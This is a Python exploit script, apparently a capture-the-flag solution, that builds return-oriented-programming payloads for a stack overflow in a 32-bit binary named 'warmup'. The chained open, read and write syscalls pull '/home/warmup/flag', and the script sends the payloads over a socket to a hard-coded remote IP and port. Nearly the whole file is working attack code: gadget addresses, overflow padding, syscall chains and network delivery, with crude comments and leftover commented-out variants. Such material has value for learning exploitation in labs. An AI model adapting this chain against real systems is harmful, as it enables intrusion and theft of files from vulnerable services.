#!/usr/bin/env python3

import struct
import sys

def p(x):
    return struct.pack("<I", x)

# Gadget

rop_exit = 0x804814d  # eax=1; ebx=0; int 0x80 // exit(0)
# use read to set eax
rop_read = 0x804811d  # read
rop_set_ebx_ecx_edx_int_80 = 0x8048122

rop_write = 0x8048135

rop_sub_0x10 = 0x80480d8

rop_add_esp_0x30 = 0x080481b8 # back to the fucking entry point !

rop_before_call_read = 0x804815a # with sub esp, 0x30
rop_before_call_read2 = 0x804815d # without touching the stack

# 0x30 => 48 => 4 * 12

rop_pop_esp = 0x08048123
rw_memory = 0x080491bc
rw_memory = 0x080491d3

rop_alarm = 0x804810d

read_buffer = 0xffffd2fc # gdb
read_buffer = 0xffffd2ac
read_buffer = 0xffffd2dc # this relly on ASLR fuck it !

#read_buffer = rw_memory
# read_buffer += 0 if len(sys.argv) == 1 else int(sys.argv[1])

target = "remote"

if len(sys.argv) > 1 and sys.argv[1] in ("remote", "local"):
    target = sys.argv[1]
# read_buffer = rw_memory

flag_path = b"/home/warmup/flag\x00"

# because netcat don't start the elf until data has been received
# send some shit here
payload_trigger_alarm = [
    b"A" * 32,
    p(rop_before_call_read2),
] + [p(0xdeadbeef)] * 4 # full fill their read

# load filename to rw_no_aslr_memrory
payload0 = [
    b"A" * 32,
    p(rop_read),
    p(rop_before_call_read2),
    p(0),
    p(rw_memory),
    p(len(flag_path)),
    flag_path
]

# open the flag
payload1 = [
    b"A" * (32 - 6),
    b"ABCD**",
    ### payload to load big payload
    p(rop_alarm),
    p(rop_set_ebx_ecx_edx_int_80),
    p(rop_before_call_read2),  # seconds for alarm
    p(rw_memory),  # filename
    p(0x2), # mode // basically we don't care
    ## #######       STACK PIVOT LA ! et c'est gagné
    ## p(rop_before_call_read), # <= here will be the next rop ##
    ## p(0),  # fd
    ## p(rw_memory),
    ## #p(read_buffer + 32 + 4),  # buffer => make it overwrite the next rop
    #   ##  p(100),
    ## # p(4 * 2),  # size // add it after because it have to be precise
]

# read the flag
payload2 = [
    b"A" * (32 - 6),
    b"ABCD**",
    ### payload to load big payload
    p(rop_read),
    p(rop_before_call_read2),
    p(4),  # fd
    p(rw_memory),  # filename
    p(512), # size
    ## #######       STACK PIVOT LA ! et c'est gagné
    ## p(rop_before_call_read), # <= here will be the next rop ##
    ## p(0),  # fd
    ## p(rw_memory),
    ## #p(read_buffer + 32 + 4),  # buffer => make it overwrite the next rop
    #   ##  p(100),
    ## # p(4 * 2),  # size // add it after because it have to be precise
]

payload3 = [
    b"A" * (32 - 6),
    b"ABCD**",
    ### payload to load big payload
    p(rop_write),
    p(rop_before_call_read2),
    p(3),  # fd
    p(rw_memory),  # filename
    p(512), # size
    ## #######       STACK PIVOT LA ! et c'est gagné
    ## p(rop_before_call_read), # <= here will be the next rop ##
    ## p(0),  # fd
    ## p(rw_memory),
    ## #p(read_buffer + 32 + 4),  # buffer => make it overwrite the next rop
    #   ##  p(100),
    ## # p(4 * 2),  # size // add it after because it have to be precise
]




payload_old = [
    ### payload 2
    # set eax=5 using read (5 == open)
    p(rop_read),

    p(rop_add_esp_0x30), # clean the stack for the next rop
    p(0),  # fd
    p(read_buffer - 10),
    p(5),  # set eax=5

] + [p(0xdeadbeef)] * (12-3) + [
    # time to open
    p(rop_set_ebx_ecx_edx_int_80),
    p(rop_add_esp_0x30), # .. "
    p(read_buffer),  # filename
    p(0x2),  # RD_ONLY
    p(0x00),  # mode // ignore this shit
] + [p(0xdeadbeef)] * (12-3) + [

    # read the flag
    p(rop_read),
    p(rop_add_esp_0x30), # .. "
    p(0x3),
    p(read_buffer),
    p(512),

] + [p(0xdeadbeef)] * (12-3) + [

    # write the flag
    p(rop_write),
    p(rop_add_esp_0x30),
    p(0x1),
    p(read_buffer),
    p(512),

] + [p(0xdeadbeef)] * (12-3) + [
    p(rop_exit),
]

trigger_netcat = b''.join(payload_trigger_alarm)

payload = b''.join(
    payload0 +
    payload1 +
    payload2
    #[p(len(payload2) * 4)] +  # precise size for the read...
    #payload2 +
    #[b"A" * 5]  # 5 bytes for the read // set eax=5
    )

open('input', 'wb').write(payload)

import socket

if target == "remote":
    print("REMOTE")
    HOST, PORT = "202.120.7.207", 52608
else:
    HOST, PORT = "localhost", 4242

import time

s = socket.socket()


s.connect((HOST, PORT))
s.send(trigger_netcat)
time.sleep(5)

s.send(payload)

print(s.recv(4096))
print(s.recv(4096))
print(s.recv(4096))
print(s.recv(4096))

# from subprocess import Popen, PIPE
#
# p = Popen(['./warmup'], stdout=PIPE, stdin=PIPE, stderr=PIPE)
# time.sleep(5)
# out, err = p.communicate(input=payload)
# print(out)
# print('-'*30)
# print(err)
#
